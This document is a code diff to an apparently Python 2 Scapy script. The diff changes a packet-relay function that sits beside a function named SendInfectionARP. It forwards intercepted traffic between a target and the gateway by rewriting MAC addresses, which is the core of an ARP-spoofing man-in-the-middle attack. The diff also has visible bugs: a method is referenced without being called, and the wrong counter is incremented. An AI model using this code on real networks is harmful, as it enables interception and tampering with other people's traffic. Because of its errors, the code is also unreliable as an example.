@@ -103,30 +103,32 @@ def SendInfectionARP(eth_src_mac, eth_dst_mac, arp_pdst, arp_hwdst, arp_psrc, ar
 def RelayPacket(pkt):
 	global targetMAC, gatewayMAC
 
-	if IPv6 not in pkt:          # no IPv6
+	if IPv6 not in pkt and ARP not in pkt:          # no IPv6
 		cnt = 0
 		cntt = 0
 		try:
-			if Ether in pkt and ARP not in pkt:
-				sourceMAC = pkt.sprintf("%Ether.src%")
-				if sourceMAC == targetMAC:
+			if IP in pkt:
+				sourceIP = pkt.sprintf("%IP.src%")
+				if sourceIP == targetIP:
 					pkt.src = myInfo.GetMyMac()
 					pkt.dst = gatewayMAC
 					frags=fragment(pkt,fragsize=1024)
 					for frag in frags:
 						sendp(frag, verbose=False)
+						if cnt > 1:
+							print cnt
 						cnt += 1
-						print cnt
 						#print frag.show()
 
-				elif sourceMAC == gatewayMAC:
+				elif sourceIP == myInfo.GetMyGateway:
 					pkt.src = myInfo.GetMyMac()
 					pkt.dst = targetMAC
 					frags=fragment(pkt,fragsize=1024)
 					for frag in frags:
 						sendp(frag, verbose=False)
-						cntt += 1
-						print cntt
+						if cntt > 1:
+							print cntt
+						cnt += 1
 						#print frag.show()
 		except:
 			print pkt.show()
